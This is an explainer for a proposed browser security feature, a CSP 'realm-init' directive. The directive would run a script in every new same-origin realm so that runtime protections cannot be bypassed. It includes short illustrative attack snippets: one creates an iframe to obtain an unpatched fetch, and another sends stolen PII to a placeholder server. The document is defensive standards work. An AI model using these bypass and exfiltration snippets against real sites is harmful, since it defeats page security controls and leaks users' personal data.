# RIC Proposal (Explainer)

> _**R**ealms **I**nitialization **C**ontrol proposal (to introduce **security controls** to [same origin realms](#Same-Origin-Realm) in web applications)_

The proposal for **R**ealms **I**nitialization **C**ontrol (referred to as **RIC**) allows developers to securely tap into the creation moment of [same origin realms](#Same-Origin-Realm) within their web application in order to tame and control them.

While from a **usability** point of view this is already natively provided by the platform by using `load` events of iframes for example:

```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://example.com/';
iframe.style.display = 'none';
iframe.onload = () => iframe.style.display = 'block';
document.body.appendChild(iframe);
```

**RIC** attempts to provide this from a **security** point of view, which requires addressing [same origin realms](#Same-Origin-Realm) initialization significantly differently, because of how they can be manipulated against security mechanisms the app might wish to dictate.

> _Authored by [Gal Weizman](https://github.com/weizman) , [Zbigniew Tenerowicz
](https://github.com/naugtur) ([participate here](https://github.com/weizman/Realms-Initialization-Control-API/issues))_

## Table of contents

* [Abstract](#Abstract)
* [Motivation](#Motivation)
    * [Prior art](#Prior-art)
    * [Limitations](#Limitations)
* [Goals](#Goals)
* [Proposal](#Proposal)
* [Example](#Example)
* [Use Cases](#Use-Cases)
* [Discussion](#Discussion)
* [Self-Review Questionnaire: Security and Privacy](#self-review-questionnaire-security-and-privacy)
* [Terminology](#Terminology)
* [Resources](#Resources)

## Abstract

The evolution of how web applications are being composed is moving towards leaning on code written by other parties more. 

While great in terms of productivity, integration of code that applications do not know nor control naturally introduces security risks.  
No matter how great JavaScript is for easily composing software out of smaller blocks of software, not being able to do so securely will hinder this positive trend.  

To safely scale software composability, application developers must be able to [virtualize](#Virtualization-(in-JavaScript)) web environments at runtime to harden their security and prevent unauthorized entities from accessing [capabilities](#Capabilities) they should not have access to. 

While software providing various runtime protections focused on addressing this matter exists, its security is easily undermined by limited control over manipulating realms.  

This lack of control is also referred to as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf) which is what this proposal focuses on addressing.
It refers to how [same origin realms](#Same-Origin-Realm) leak powerful [capabilities](#Capabilities) to unauthorized entities at runtime in a fundamentally uncontrollable way.  

Introducing a new CSP directive that sets a script to run at the start of each new realm in the application's origin would solve this by allowing web applications to capture same origin realms when initialized to customize them into mitigating the risk they expose the app to.

## Motivation

The problem with [same origin realms](#Same-Origin-Realm) (also known as the [same origin concern](https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf)) is not obvious because it comes into play only in the security and containment context, such as when trying to harness the power of [virtualization in JavaScript](#Virtualization-(in-JavaScript)) for enhanced security at runtime. Therefore, it requires explanation.

The web is a great platform for creating composable software, but not to do so securely - the environment and the APIs available make it extremely difficult for applications to contain a program without having to trust it, especially when interacting with the DOM.

Unfortunately, securing a supply chain - telling good code from bad code within the dependencies from which an application is composed - is very hard. 
This is evident by the prevalence of services focused on detecting threats both before they get baked into an application (at build-time) and while being executed on the fly (at runtime).

One way to approach this problem at runtime is by [virtualization](#Virtualization-(in-JavaScript)) - redefining JavaScript [capabilities](#Capabilities) (commonly known as [monkey patching](https://en.wikipedia.org/wiki/Monkey_patch)) to behave similarly while hardening them to limit how they can be used.

However, due to some characteristics of how the web is designed, there are some major blockers in fully unleashing the power of virtualization in favor of introducing runtime security.

One of those blockers is the lack of control web applications have over safe introduction of same origin realms into their execution environment at runtime.

Any capability limited by a security tool in the current realm of the application:

```javascript
/* security tool mitigating access to powerful capabilities */

function mitigate(realm) {
    Object.defineProperty(realm, 'fetch', {
        get: () => {
            throw new Error('Access to powerful capability "fetch" is forbidden')
        }
    })
}

mitigate(window)
```

can be easily obtained as a fresh new instance from a fresh new realm:

```javascript
/* attacker bypassing mitigation by leveraging the same origin concern */ 

function stealFetch() {
    try {
        return window.fetch
    } catch (err) { // Uncaught Error: Access to powerful capability "fetch" is forbidden
        const ifr = document.createElement('iframe')
        const realm = document.body.appendChild(ifr).contentWindow
        return realm.fetch
    }
}

// function fetch() { [native code] }
const newFetchInstance = stealFetch()
```

The motivation behind this proposal is to remove this blocker by providing developers a way to control the initialization of same origin realms to tame access to powerful capabilities those leak.   

### Prior art

We have been working on a virtualized solution called [Snow JS ❄️](https://github.com/lavamoat/snow) to allow applying security mechanisms to same origin realms automatically.
Snow expects a callback, which it'll fire immediately with every new realm that comes to life within the same origin of the application.

In the context of the former example, this allows security tools to not worry about the same origin concern, and thus continue to focus on building their security mechanisms instead.

So by asking Snow to execute the mitigation logic from earlier:

```javascript
/* security tool same protection mechanism, but this time with Snow */

SNOW(realm => mitigate(realm))
```

Snow makes sure to detect same origin realms creation, and by tapping into them, to also run the logic on them immediately and thus to easily cancel the impact of the same origin concern: 

```javascript
/* attacker same bypass won't work this time */ 

// Uncaught Error: Access to powerful capability "fetch" is forbidden
const newFetchInstance = stealFetch()
```

### Limitations

Unfortunately, implementing a user-land solution comes with some fundamental flaws:

#### Scalability

There are too many ways to create same origin realms, and the list keeps on growing as the web evolves. Constantly chasing all the different ways of forming a new realm and attempting to patch them doesn't scale. 

#### Hermeticity

Some of those ways are unaddressable in user-land. Building a bulletproof virtualized solution seems to be impossible.

Race condition in iframe initialization is one example of this - successfully reaching capabilities from a new realm is possible before its `load` event is emitted and reliably determining the earliest moment it becomes available is not feasible:

![Screenshot 2024-03-03 at 11 06 18](https://github.com/weizman/Realms-Initialization-Control-API/assets/13243797/5fd96798-2442-4b6e-9be8-391ecca042f1)

#### More

Other downsides such as performance, compatibility and continuous resilience of such a solution are more important reasons for why achieving this in the user land is far from ideal.

## Goals

* Give web applications control over all realms that fall under their origin - regardless of the APIs used to create the new realm and edge-cases like `about:blank`.
* Make the control opt-in to avoid breaking the web.

The browser is already capable of enforcing rules on new realms before they become reachable, and it is where the same origin concern should also be addressed.

## Proposal

Initialization of same origin realms in an application should be under that application's control.

This proposal describes an opt-in capability to set a script to be loaded first, everytime a same origin realm with synchronous access to the main execution environment of the application is created.

The location of the script can be relative or absolute. Secure connection is required.
The proposed method for setting the script is a Content Security Policy directive as follows:

```
Content-Security-Policy: "realm-init: /scripts/on-new-same-origin-realm.js"
```

## Example

> _This is a simplified demonstration of the proposal - skip over for real world [Use Cases](#Use-Cases)_ 

Prevent network requests revealing Personally Identifiable Information (the feasibility of `containsPII`/`stealPII` is irrelevant to the example as it serves only to illustrate this example).

* `index.html`

```html
Content-Type: text/html
Content-Security-Policy: default-src 'self'; connect-src *; realm-init: /scripts/monitor.js

<html>
  <title> Ticket King - Checkout </title>
  <head>
...
```

* `/scripts/monitor.js`

```javascript
/* monitor.js - redefine fetch API to block leakage of PII data */

function mitigate(realm) {
    const realFetch = window.fetch
    Object.defineProperty(realm, 'fetch', {
        get: () => {
            if (containsPII(resource, options)) {
                throw new Error(`fetch "${resource}" is blocked for containing sensitive PII!`)
            }
            return realFetch.call(this, resource, options)
        }
    })
}

mitigate(window)
```

As a result of the CSP directive pointing to `monitor.js`, the security logic introduced by it will be applied to all same origin realms that can be manipulated against the execution environment of the application (as opposed to allowing scripts to create a new realm and use its clean copy of fetch).

Making the following bypass no longer viable:

```js
const newFetchInstance = stealFetch()
const payload = stealPII()
newFetchInstance(`https://${server}/${path}/?payload=` + payload) 
```

## Use Cases

> *Adding use cases is a WIP - if you find this proposal useful (or just want to explore some potential use cases), help by visiting [#4](https://github.com/weizman/Realms-Initialization-Control/issues/4) and share your use case to push this proposal forward!*

## Discussion

### Feasibility and implementation

The proposed mechanism mostly relies on functionality already present elsewhere in the browser.

* Running the pre-defined script on each realm initialization already exists in browser extensions as `"run_at": "document_start"` for content scripts.
* Setting the script is being done via CSP, which is an excellent mechanism for canonically enforcing rules to a certain origin.
* Supplying a script path the browser would remember across page loads exists in service worker implementation.

### Canonicality

The browser will load the script defined by the new CSP directive of the top main realm for each new child realm.

Meaning, the top main realm is the only realm in a webpage with the power to set the new CSP directive, and it must trickle down to child realms from the same origin, as they don't have the power to set this directive.

This already goes with how CSP is currently enforcing its rules canonically in the lifetime of a webpage. 

### Comparison with `X-frames` and `frame-src`

`X-frames` and `frame-src` allow controlling what is allowed to be loaded into an `iframe`. Regardless of their use to deny loading content in iframes, ways to crete new same origin realms remain available, such as creating an `about:blank` iframe, opening a new tab using `open` API and more.

## [Self-Review Questionnaire: Security and Privacy](https://w3ctag.github.io/security-questionnaire/)

> 01.  What information does this feature expose, and for what purposes?

This feature allows a website to register JavaScript code to be executed within new realms that fall under its jurisdiction (same origin) before any other JavaScript code gets to run within them.
Thus, the information it naturally exposes is regarding when a new same origin realm is introudced under the execution environment of the top realm of the website.

> 02.  Do features in your specification expose the minimum amount of information necessary to implement the intended functionality?

Yes, I believe so - no further information is being provided to the website other than what's described under Q#1

> 03.  Do the features in your specification expose personal information, personally-identifiable information (PII), or information derived from either?

No

> 04.  How do the features in your specification deal with sensitive information?

They have nothing to do with such information

> 05.  Does data exposed by your specification carry related but distinct information that may not be obvious to users?

The only distinct information that's being provided to the user that was not possible before is when same origin realms are introduced into the website's execution environment

> 06.  Do the features in your specification introduce state that persists across browsing sessions?

The only thing that might persist across browsing sessions is a new cached resource which is the remote JavaScript file that's being dictated to be fetched and executed by the new proposed CSP directive in the proposal

> 07.  Do the features in your specification expose information about the underlying platform to origins?

No

> 08.  Does this specification allow an origin to send data to the underlying platform?

The only data that's being sent to the underlying platform is the value of the configured new CSP directive which should be parsed into a URL of a remote resource

> 09.  Do features in this specification enable access to device sensors?

No

> 10.  Do features in this specification enable new script execution/loading mechanisms?

Yes, this feature focuses on allowing a website to register JavaScript code to be loaded within new realms when are introduced into the execution environment of the website at runtime.
While the browser somewhat knows already how to load JavaScript code within new realms with features such as `content_script:run_at`, granting such power to websites (rather than extensions) is necessarily new.

> 11.  Do features in this specification allow an origin to access other devices?

No

> 12.  Do features in this specification allow an origin some measure of control over a user agent's native UI?

No

> 13.  What temporary identifiers do the features in this specification create or expose to the web?

None

> 14.  How does this specification distinguish between behavior in first-party and third-party contexts?

This feature expects the website to provide a URL to a remote JavaScript file to be loaded within new same origin realms only, so naturally there's an important distinction where the file should only be loaded and executed within first-party contexts and not third-party contexts. Telling them apart should (hopefully) be rather straight forward since CSP is already very good at this exactly.

> 15.  How do the features in this specification work in the context of a browser’s Private Browsing or Incognito mode?

N/a

> 16.  Does this specification have both "Security Considerations" and "Privacy Considerations" sections?

ASK @yoavweiss

> 17.  Do features in your specification enable origins to downgrade default security protections?

No

> 18.  What happens when a document that uses your feature is kept alive in BFCache (instead of getting destroyed) after navigation, and potentially gets reused on future navigations back to the document?

N/a

> 19.  What happens when a document that uses your feature gets disconnected?

My feature takes place (start to finish) synchronously when the document is introduced to the environment, meaning that if disconnection takes place, it does so after my feature is done necessarily.

> 20.  Does your feature allow sites to learn about the users use of assistive technology?

No

> 21.  What should this questionnaire have asked?

Nothing that comes to mind atm

## Terminology

### Capabilities

APIs provided by the JavaScript and/or browser execution environment (e.g. `Array`, `Object`, `fetch`, `document`, etc).

### Virtualization (in JavaScript)

Virtualization is an abstract concept that could mean many things depends on the context. In the context of JavaScript, this refers to the action of redefining builtin [capabilities](#Capabilities) in the language in order to introduce more logic into them and enhance their value.

### Realm

The technical terminology for the execution environment provided in JavaScript along with a distinct set of [capabilities](#Capabilities) mostly reachable by a representing global object. In the browser environment, the global object is accessible via `window`. Realms can be formed in various ways in the browser ecosystem, most commonly by creating `iframe`s, opening tabs or popup windows using `open` API, using `Worker`s and more. Each of those have its own set of [capabilities](#Capabilities), its own execution environment and its own global object - its own realm ([learn more](https://weizmangal.com/2022/10/28/what-is-a-realm-in-js/)).

### Same Origin Realm

In the browser ecosystem, [realms](#Realm) are associated with an origin. For example, when loading `https://facebook.com/` into the browser, the app loads into a new [realm](#Realm) that is associated with the `facebook.com` origin. Additionally, at any point the app can decide to initialize a child [realm](#Realm), and that [realm](#Realm) can also be associated with an origin. For example, if the `https://facebook.com/` app attaches into its DOM an iframe directed at `https://facebook.com/iframe-page.html`, it'll trigger the creation of a second [realm](#Realm) living within the app at runtime. And since its origin is also `facebook.com`, the two [realms](#Realm) have the same origin - hence the name.

### Cross Origin Realm

The opposite of a [same origin realm](#Same-Origin-Realm) - if the origin of realm A is not the same as the origin of realm B, that means realm A is a cross-origin realm to realm B, and vice versa.

## Resources

* Further reading on realms security - https://github.com/weizman/awesome-javascript-realms-security
* "The Same Origin Concern" - https://weizmangal.com/content/pdf/The%20same%20origin%20concern.pdf
* "JavaScript realms used to bypass and eliminate web apps security tools - A problem with a WIP solution" (presented to W3C) - https://www.w3.org/2023/03/secure-the-web-forward/talks/realms.html
* Snow JS ❄️ - https://github.com/lavamoat/snow
